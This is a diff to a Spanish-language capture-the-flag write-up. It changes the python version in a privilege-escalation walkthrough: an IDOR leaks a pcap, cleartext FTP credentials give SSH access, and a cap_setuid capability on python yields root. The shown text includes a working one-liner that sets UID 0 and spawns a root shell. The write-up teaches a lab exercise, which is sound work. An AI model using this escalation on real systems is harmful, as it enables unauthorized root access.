@@ -18,7 +18,7 @@ tags: [linux, web, idor, pcap, capabilities]
 
 ## TL;DR
 
-Panel que genera capturas de tráfico en formato pcap y las sirve por un identificador incremental. Cambiando ese identificador se descarga la captura de otro usuario, y dentro viaja una sesión **FTP en claro**. Con esas credenciales se entra por SSH, y `getcap` muestra que `python3.15` tiene `cap_setuid` → root directo.
+Panel que genera capturas de tráfico en formato pcap y las sirve por un identificador incremental. Cambiando ese identificador se descarga la captura de otro usuario, y dentro viaja una sesión **FTP en claro**. Con esas credenciales se entra por SSH, y `getcap` muestra que `python3.8` tiene `cap_setuid` → root directo.
 
 ## Reconocimiento
 
@@ -89,13 +89,13 @@ getcap -r / 2>/dev/null
 ```
 
 ```
-/usr/bin/python3.15 cap_setuid=ep
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
 Ese binario puede cambiar su propio UID a 0, así que una línea basta:
 
 ```bash
-/usr/bin/python3.15 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id                 # uid=0(root)
 cat /root/root.txt # <ROOT_FLAG>
 ```
@@ -112,7 +112,7 @@ cat /root/root.txt # <ROOT_FLAG>
 - Un identificador incremental en una URL es un IDOR en potencia: si el servidor no comprueba la propiedad, el dato es de todos.
 - FTP transmite credenciales en claro; basta una captura para reutilizarlas en SSH.
 - Las *capabilities* son un SUID moderno: `cap_setuid` en un intérprete es root inmediato y no aparece en `find -perm -4000`.
-- `getcap -r /` debería ser tan obligatorio como buscar SUIDs en cualquier Linux.
+- `getcap -r /` debería ser tan obligatorio como buscar SUIDs en cualquier Linux. La versión exacta la manda la salida de `getcap`, no el escaneo: aquí es `python3.8`, no la que aparezca en el banner del puerto.
 
 ## Mitigaciones y detección
 
